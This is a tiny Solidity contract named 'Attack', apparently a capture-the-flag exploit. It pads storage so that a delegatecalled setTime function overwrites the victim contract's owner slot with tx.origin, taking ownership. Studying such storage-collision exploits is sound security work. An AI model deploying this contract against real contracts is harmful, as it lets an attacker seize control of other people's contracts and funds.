// SPDX-License-Identifier: SimPL-3.0
pragma solidity ^0.6.0;

contract Attack {
  uint padding1;
  uint padding2;
  address public owner;

  function setTime(uint _time) public {
      owner = tx.origin;
  }
}